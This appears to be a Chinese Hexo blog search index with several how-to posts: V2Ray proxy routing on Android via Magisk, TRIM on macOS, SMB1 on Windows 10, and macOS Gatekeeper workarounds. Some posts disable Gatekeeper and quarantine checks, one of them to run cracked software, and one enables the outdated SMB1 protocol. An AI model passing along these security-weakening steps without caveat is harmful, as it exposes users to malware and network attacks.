<span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"direct"</span><span class="token punctuation">,</span>        <span class="token property">"domain"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"geosite:cn"</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        //放行国内dns地址        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"direct"</span><span class="token punctuation">,</span>        <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"223.5.5.5/32"</span><span class="token punctuation">,</span>          <span class="token string">"119.29.29.29/32"</span><span class="token punctuation">,</span>          <span class="token string">"180.76.76.76/32"</span><span class="token punctuation">,</span>          <span class="token string">"114.114.114.114/32"</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        //代理国内dns地址        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"proxy"</span><span class="token punctuation">,</span>        <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"1.1.1.1/32"</span><span class="token punctuation">,</span>          <span class="token string">"1.0.0.1/32"</span><span class="token punctuation">,</span>          <span class="token string">"8.8.8.8/32"</span><span class="token punctuation">,</span>          <span class="token string">"8.8.4.4/32"</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        //放行国内ip和私有地址        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"direct"</span><span class="token punctuation">,</span>        <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"geoip:cn"</span><span class="token punctuation">,</span>          <span class="token string">"geoip:private"</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span></code></pre><p>可以复制到自己的文件中，这样就实现了精准的分流。</p><h2 id="0x03高级"><a href="#0x03高级" class="headerlink" title="0x03高级"></a>0x03高级</h2><p>在这个版块将不再赘述<strong>进阶</strong>中的操作步骤</p><h3 id="通过WiFi热点来共享网络"><a href="#通过WiFi热点来共享网络" class="headerlink" title="通过WiFi热点来共享网络"></a>通过WiFi热点来共享网络</h3><p>共享自己的代理给wifi热点</p><p>默认情况下是自动共享的，但有时候却不是那么尽人意。打开文件<code>/data/v2ray/softap.list</code>默认情况下会有<code>softap0</code>字样，这是WiFi热点接口名称。你可以通过<code>ip addr</code>来查看你的设备中热点接口的名称，并不是所以的设备都是<code>softap0</code>。你需要在此文件中写入自己的热点接口名称。<br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/Screenshot_2020-02-28-19-02.webp"></p><h2 id="开发-amp-amp-未测试"><a href="#开发-amp-amp-未测试" class="headerlink" title="开发 &amp;&amp; 未测试"></a>开发 &amp;&amp; 未测试</h2><h3 id="进入手动模式"><a href="#进入手动模式" class="headerlink" title="进入手动模式"></a>进入手动模式</h3><p>如果要通过完全运行命令来控制V2Ray，只需添加一个文件/data/v2ray/manual。在这种情况下，V2Ray服务将不会在启动时自动启动，并且您无法通过Magisk Manager应用程序管理服务的启动/停止。</p><p>管理服务启动/停止<br>V2Ray服务脚本是<code>$MODDIR/scripts/v2ray.service</code>。</p><p>启动服务：<br><code>/sbin/.magisk/img/v2ray/scripts/v2ray.service start</code></p><p>停止服务：<br><code>/sbin/.magisk/img/v2ray/scripts/v2ray.service stop</code></p><p>管理透明代理启用/禁用<br>透明的代理脚本是<code>$MODDIR/scripts/v2ray.tproxy</code>。</p><p>启用透明代理：<br><code>/sbin/.magisk/img/v2ray/scripts/v2ray.tproxy enable</code></p><p>禁用透明代理：<br><code>/sbin/.magisk/img/v2ray/scripts/v2ray.tproxy disable</code></p><h3 id="通过wifi来共享网络给局域网中的其它人-（未测试，请自测）"><a href="#通过wifi来共享网络给局域网中的其它人-（未测试，请自测）" class="headerlink" title="通过wifi来共享网络给局域网中的其它人 （未测试，请自测）"></a>通过wifi来共享网络给局域网中的其它人 （未测试，请自测）</h3><p>打开<code>config.json</code>文件在<code>inbounds</code>中添加</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>      //监听socks<span class="token punctuation">,</span>端口为<span class="token number">1080</span>      <span class="token property">"protocol"</span><span class="token operator">:</span> <span class="token string">"socks"</span><span class="token punctuation">,</span>      <span class="token property">"listen"</span><span class="token operator">:</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>      <span class="token property">"port"</span><span class="token operator">:</span> <span class="token number">1080</span><span class="token punctuation">,</span>      <span class="token property">"tag"</span><span class="token operator">:</span> <span class="token string">"socks-in"</span><span class="token punctuation">,</span>      <span class="token property">"settings"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span>        <span class="token property">"udp"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auth"</span><span class="token operator">:</span> <span class="token string">"noauth"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"sniffing"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"destOverride"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"tls"</span><span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>    //监听http<span class="token punctuation">,</span>端口为<span class="token number">1081</span>      <span class="token property">"protocol"</span><span class="token operator">:</span> <span class="token string">"http"</span><span class="token punctuation">,</span>      <span class="token property">"listen"</span><span class="token operator">:</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>      <span class="token property">"port"</span><span class="token operator">:</span> <span class="token number">1081</span><span class="token punctuation">,</span>      <span class="token property">"tag"</span><span class="token operator">:</span> <span class="token string">"http-in"</span><span class="token punctuation">,</span>      <span class="token property">"sniffing"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"destOverride"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"tls"</span><span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>然后在<code>rules</code>中</p><pre class=" language-json"><code class="language-json">    <span class="token punctuation">{</span>        //代理dns请求        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"inboundTag"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"dns-in"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"dns-out"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><p>修改为</p><pre class=" language-json"><code class="language-json">    <span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"dns-out"</span><span class="token punctuation">,</span>        <span class="token property">"inboundTag"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"socks-in"</span><span class="token punctuation">,</span>          <span class="token string">"http-in"</span><span class="token punctuation">,</span>          <span class="token string">"dns-in"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"network"</span><span class="token operator">:</span> <span class="token string">"tcp,udp"</span>      <span class="token punctuation">}</span></code></pre><p>反正我没测试过，如果有问题参考官方文档 <a href="v2ray.com">官方文档</a></p><p>还有其它的玩法，请自行参考官方档。能玩得那么骚的，也不用来看我了。。。。</p><h2 id="0x04踩的坑"><a href="#0x04踩的坑" class="headerlink" title="0x04踩的坑"></a>0x04踩的坑</h2><h3 id="Google服务无法使用，联不上网"><a href="#Google服务无法使用，联不上网" class="headerlink" title="Google服务无法使用，联不上网"></a>Google服务无法使用，联不上网</h3><p>一些是国行的手机，有些国行手机内置了google服务，但使用了这个模块后没法访问，原因是国行手机把google的地址指向了googleapis.cn。这个地址不可用。所以只要强制代理这个地址就好了。</p><p>在config.json的rules中加入</p><pre class=" language-json"><code class="language-json">            <span class="token punctuation">{</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>                <span class="token property">"domain"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"domain:googleapis.cn"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"proxy"</span>            <span class="token punctuation">}</span></code></pre><p>重启一下就好了</p>]]></content>
      
      
      <categories>
          
          <category> 手机技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络技巧 </tag>
            
            <tag> 系统技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxx镜像已损坏,无法打开</title>
      <link href="2020/xxx-jing-xiang-yi-sun-pi-wu-fa-da-kai/"/>
      <url>2020/xxx-jing-xiang-yi-sun-pi-wu-fa-da-kai/</url>
      
        <content type="html"><![CDATA[<h1 id="解决Mac镜像已损坏不能运行问题"><a href="#解决Mac镜像已损坏不能运行问题" class="headerlink" title="解决Mac镜像已损坏不能运行问题"></a>解决Mac镜像已损坏不能运行问题</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>在MacOS运行一些破解软件的时候问题可能会出现<code>xxx已损坏，无法打开。您应该将它移到废纸篓</code>。</p><p>出现提示的原因是，苹果系统有一个GateKeeper保护机制（自 OSX 10.5 加入）。从互联网上下载来的文件，会被自动打上com.apple.quarantine标志，翻译过来就是免疫隔离，系统根据这个附加属性对这个文件作出限制。</p><p>所以我们只要移除这个附加属性就能重新打开软件</p><p><img src="https://raw.githubusercontent.com/lyl12321/picture/master/QQ20200226-141201%402x.webp"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>查阅了一些资料后发现网上很多的教程都是用重新签名的方法来修复，我个人感觉这种方法不是特别的好用，我们可以用 <code>xattr</code> 命令来达到我们的目的。</p><p>打开iTerm2,键入 <code>sudo xattr -d com.apple.quarantine /Applications/xxx</code> xxx为程序名，以.app结尾。然后输入自己的管理员密码。然后再次打开刚刚损坏的程序。可以发现刚刚打不开的程序又能打开了。</p><p><img src="https://raw.githubusercontent.com/lyl12321/picture/master/QQ20200226-144524%402x.webp"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://superuser.com/questions/28384/what-should-i-do-about-com-apple-quarantine">https://superuser.com/questions/28384/what-should-i-do-about-com-apple-quarantine</a></p>]]></content>
      
      
      <categories>
          
          <category> macOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统技巧 </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 10 下访问校园网共享服务器</title>
      <link href="2019/windows-10-xia-fang-wen-xiao-yuan-wang-gong-xiang-fu-wu-qi/"/>
      <url>2019/windows-10-xia-fang-wen-xiao-yuan-wang-gong-xiang-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学校会经常会访问 <code>\\192.168.88.88</code> 这么一个 <code>IP</code> 地址</p><p>它是学校为了解决各终端设备之间的<code>文件共享</code>问题所搭建的内网 <code>SMB</code> 服务器</p><p>经过初步扫描发现学校的 <code>SMB</code> 有三务器进行负载均衡,每台各存储不同的资料内容</p><p><img src="https://raw.githubusercontent.com/cloverkits/hexo_picture_resource/master/picture/VLAN.png"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>由于宿舍宽带接入通过学校的<code>网关</code>我们可以直接在<code>资源管理器</code>中直接访问 <code>SMB</code> 服务器</p><p>我猜想学校使用了 <code>VLAN</code> 技术把宿舍的宽带和内网以某种方式形成一个 <code>LAN</code> 局域网</p><p>然而在实际使用中却发生了问题，已知任何几台电脑都可以正常访问，但是在宿舍却打不开</p><blockquote><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4></blockquote><p>经过测试 <code>SMB</code> 在 <code>Windows 7</code> 系统中能够正常访问，而 <code>Windows 10</code> 或者 <code>macOS Mojave</code> 和 <code>Linux</code> 中均无法打开；而在 <code>macOS</code> 中能够使用命令扫描到内网有 <code>SMB</code> 开放端口和共享目录</p><p>后来通过 <code>Google</code> 发现了问题的关键，原因是学校的 <code>SMB</code> 文件服务器使用的协议版本太老了</p><blockquote><h4 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h4></blockquote><p>我们可以通过启用系统中的 <code>SMB</code> 旧版本支持来实现正常访问</p><ol><li>通过 Windows 搜索或者面板找到 <code>启用或关闭 Windows 功能</code></li></ol><p>![](<a href="https://raw.githubusercontent.com/cloverkits/hexo_picture_resource/master/picture/Windows">https://raw.githubusercontent.com/cloverkits/hexo_picture_resource/master/picture/Windows</a> Search.png)</p><ol start="2"><li><p>勾选 <code>SMB 1.0/CIFS File Sharing Support</code> 支持, 并按 <code>确定</code>键应用更改<br>![](<a href="https://raw.githubusercontent.com/cloverkits/hexo_picture_resource/master/picture/Enable">https://raw.githubusercontent.com/cloverkits/hexo_picture_resource/master/picture/Enable</a> Windows Feature.png)</p></li><li><p>重启电脑</p></li><li><p>在资源管理器访问 <code>\\192.168.88.88</code> 并输入你的 <code>校园统一门户</code> 账号密码完成登录</p></li></ol><p><img src="https://raw.githubusercontent.com/cloverkits/hexo_picture_resource/master/picture/VLAN_ID.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> 校园生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS 开启TRIM支持</title>
      <link href="2019/macos-kai-qi-trim-zhi-chi/"/>
      <url>2019/macos-kai-qi-trim-zhi-chi/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是TIRM"><a href="#什么是TIRM" class="headerlink" title="什么是TIRM?"></a>什么是TIRM?</h2><blockquote><p>原本在机械硬盘上，在删除数据时，系统只会在逻辑地址表的这个位置做个标记，说明这里应该是没有东西了，以后新的数据可以放在这个逻辑位置上。系统并不会发送任何请求给硬盘，因为下次在这个逻辑位置写入新数据时，系统可以直接找到磁盘上对应的物理位置，将硬盘上该处的无用数据覆盖，因此才有数据恢复的可能。所以对于硬盘的物理内容，在删除文件时其实并没有发生任何变化。</p></blockquote><blockquote><p>对于固态硬盘（SSD），由于闪存的固有特性，更新页之前必须要擦除相关块。如果不开启TRIM，在文件系统中早已被删除的块在物理上还存放着原来的数据，且SSD主控无法知道这个块已经无用，直到有新的数据要求写入该块。物理上存放已无用的数据会在SSD垃圾回收（GC）的过程中被当成有用数据对待，被这对于固态硬盘的寿命是非常不利的，同时会导致其工作效率和性能的降低。</p></blockquote><blockquote><p>而当操作系统识别到SSD并确认SSD支持TRIM后，在删除数据时，向SSD发出TRIM指令，通知SSD主控对应的页面已经无效，SSD启动GC（垃圾回收）机制时，就可以及时释放这些页面。未来有数据需要写入的时候，直接就可以写入了。</p></blockquote><blockquote><p>所以说，TRIM只是避免SSD在垃圾回收时将无用数据当成有用数据来搬运，从而延长了SSD的寿命。以上就是Trim的原理以及真正作用。”</p></blockquote><h2 id="如何开启？"><a href="#如何开启？" class="headerlink" title="如何开启？"></a>如何开启？</h2><p>如果你更换了第三方固态才需要开启，因为苹果自家的会默认开启</p><p>打开Terminal，输入<code>sudo trimforce enable</code>,即可开启TRIM功能</p><p>查看开启结果:<code>关于本机</code>-&gt;<code>系统报告</code>-&gt;<code>NVMEExpress</code>/<code>SATA/SATA Express</code>(如果你是NVME协议就在前一个选项内看，SATA就在后一个)</p><p><img src="https://raw.githubusercontent.com/lyl12321/picture/master/enable_TRIM1.webp" alt="开启TRIM后"></p>]]></content>
      
      
      <categories>
          
          <category> macOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统技巧 </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS 允许任何来源选项</title>
      <link href="2019/macos-yun-xu-ren-he-lai-yuan-xuan-xiang/"/>
      <url>2019/macos-yun-xu-ren-he-lai-yuan-xuan-xiang/</url>
      
        <content type="html"><![CDATA[<p><code>macOS Sierra</code>之后苹果默认隐藏了<code>允许任何来源</code>的选项</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol><li>打开终端，键入命令，输入密码，然后回车<br><code>sudo spctl --master-disable</code></li><li>然后打开“安全性与隐私”，开启“任何来源”选项</li></ol><p><img src="https://raw.githubusercontent.com/lyl12321/picture/master/enable_spctl.webp"></p>]]></content>
      
      
      <categories>
          
          <category> macOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统技巧 </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
